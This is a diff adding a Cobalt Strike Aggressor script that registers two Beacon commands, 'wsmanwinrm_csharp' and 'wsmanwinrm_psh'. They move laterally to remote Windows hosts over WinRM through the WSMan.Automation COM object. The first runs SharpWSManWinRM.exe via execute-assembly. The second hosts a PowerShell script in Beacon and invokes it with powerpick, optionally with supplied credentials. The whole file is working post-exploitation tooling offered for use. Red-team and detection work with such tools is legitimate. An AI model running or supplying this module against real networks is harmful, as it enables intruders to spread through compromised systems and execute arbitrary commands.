@@ -1,0 +1,122 @@
+# Leverage @bohops WSMan-WinRM technique 
+# https://github.com/bohops/WSMan-WinRM
+# https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/
+
+
+
+#register help
+beacon_command_register (
+    "wsmanwinrm_csharp", 
+    "WinRM using the WSMan.Automation COM object via csharp",
+    "\ncredit to @bohops ---> Laterally move to a remote target via WinRM using the WSMan.Automation COM object\n" .
+    "   ** User must be an Administrator or belong to the \"Remote Management Users\" group **\n\n" .
+	"Usage: wsmanwinrm_csharp <target> <command>\n" .
+    "       Example: wsmanwinrm_csharp host.domain.local notepad.exe\n\n" .
+    "Usage: wsmanwinrm_csharp <target> <command> <domain\\user> <password>\n" .
+    "       Example: wsmanwinrm_csharp host.domain.local \"cmd /c notepad.exe\" domain\\joe.user P@ssw0rd"
+);
+
+alias wsmanwinrm_csharp {
+
+    local('$input @args $target $command');
+
+    $bid = $1;
+	$input = substr($0, 18);
+    @args = split(' ', $input, 2);
+
+    #########################
+	## Check args[] length ##
+	#########################
+
+	if (size(@args) eq "2") {
+
+		$target = @args[0];
+		$command = @args[1];
+	}
+
+    ############
+	## Errors ##
+	############
+
+	if (size(@args) ne "2") {
+		berror($bid, "Invalid number of arguments:\n    * a 'target' & 'command' is required");
+		return;
+	}
+
+	if (-isadmin $bid) {
+
+        bexecute_assembly($bid, script_resource("SharpWSManWinRM.exe"), "$target $command");
+    }
+    else {
+        berror($bid, "You need elevated privileges.");
+        return;
+    }
+
+    btask($bid, "Using lateral movement via WSMan.Automation COM object via csharp on $target", "T1028");
+}
+
+#register help
+beacon_command_register (
+    "wsmanwinrm_psh", 
+    "WinRM using the WSMan.Automation COM object via powershell",
+    "\ncredit to @bohops ---> Laterally move to a remote target via WinRM using the WSMan.Automation COM object\n" .
+    "   ** User must be an Administrator or belong to the \"Remote Management Users\" group **\n\n" .
+	"Usage: wsmanwinrm_psh <target> <command>\n" .
+    "       Example: wsmanwinrm_psh MyServer.domain.local calc.exe\n\n" .
+    "Usage: wsmanwinrm_psh <target> <command> <domain\\user> <password>\n" .
+    "       Example: wsmanwinrm_psh MyServer.domain.local calc.exe domain\\joe.user P@ssw0rd"
+);
+
+alias wsmanwinrm_psh {
+local('$input $target $command $user $pass $handle $script $oneliner');
+
+    $bid = $1;
+	$input = substr($0, 15);
+    @args = split(' ', $input);
+
+    #########################
+	## Check args[] length ##
+	#########################
+
+	if (size(@args) >= "2") {
+
+		$target = @args[0];
+		$command = @args[1];
+        $user = @args[2];
+        $pass = @args[3];
+	}
+    else {
+        berror($bid, "Invalid number of arguments:\n    * a 'target' & 'command' is required");
+        return;
+    }
+  
+	if (-isadmin $bid) {
+
+       # read in the script
+        $handle = openf(getFileProper(script_resource("WSManWinRM.ps1")));
+        $script = readb($handle, -1);
+        closef($handle);
+
+        # host the script in Beacon
+        $oneliner = beacon_host_script($1, $script);
+
+        # run with specified credentials
+        if ($user && $pass in @args) {
+		    bpowerpick!($1, "Invoke-WSManWinRM -hostname $target -command $command -user $user -passwor $pass", $oneliner);
+        }
+        # runas beacons' current user token
+        else {
+            bpowerpick!($1, "Invoke-WSManWinRM -hostname $target -command $command", $oneliner);
+        }
+    }
+    
+    else {
+        berror($bid, "You need elevated privileges.");
+        return;
+    }
+
+    btask($bid, "Using lateral movement via WSMan.Automation COM object via powershell on $target", "T1028");
+};
+
+#beacon_remote_exploit_register("wsmanwinrm_csharp", "x64", "WinRM using the WSMan.Automation COM object", "&wsmanwinrm_csharp");
+#beacon_remote_exploit_register("wsmanwinrm_psh", "x64", "WinRM using the WSMan.Automation COM object", "&wsmanwinrm_psh");
